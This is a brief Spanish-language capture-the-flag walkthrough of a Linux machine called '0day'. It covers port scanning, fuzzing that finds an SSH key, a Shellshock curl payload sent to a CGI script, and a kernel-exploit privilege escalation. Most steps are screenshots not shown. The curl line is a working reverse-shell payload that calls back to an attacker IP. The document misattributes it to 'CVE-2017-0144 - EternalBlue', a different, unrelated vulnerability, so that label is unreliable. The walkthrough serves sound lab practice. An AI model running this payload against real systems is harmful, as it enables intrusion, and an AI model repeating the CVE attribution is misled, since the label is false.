#Linux #medium 
### nmap
```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.39 seconds
```

### Ports

| PORT   | STATE | SERVICE | VERSION                                                         |
| ------ | ----- | ------- | --------------------------------------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.7 ((Ubuntu))                                   |

### Enumeración puerto 80

![[Pasted image 20240612151821.png]]

### Fuzzing con wffuzz

![[Pasted image 20240612151826.png]]
###### en el directorio backup encontramos un id_rsa
![[Pasted image 20240612151830.png]]

### Common Vulnerabilities and Exposures
###### CVE-2017-0144 - EternalBlue
```python
curl -A "() { :; }; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp/10.8.74.185/7890 0>&1" "http://10.10.245.192/cgi-bin/test.cgi"
```

![[Pasted image 20240612151835.png]]

### Escalada de privilegios

###### sacamos el hash del id_rsa
![[Pasted image 20240612151842.png]]
parece que no funciona esta id_rsa

### Enumeracion del sistema

![[Pasted image 20240612151852.png]]
tenemos un exploit para esta version de linux. creamos un servidor y lo compartimos con la maquina
###### vamos a sobre escribir el path debido a que el actual parece estar dañado
```python
	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

![[Pasted image 20240612151856.png]]

### WE ARE ROOT
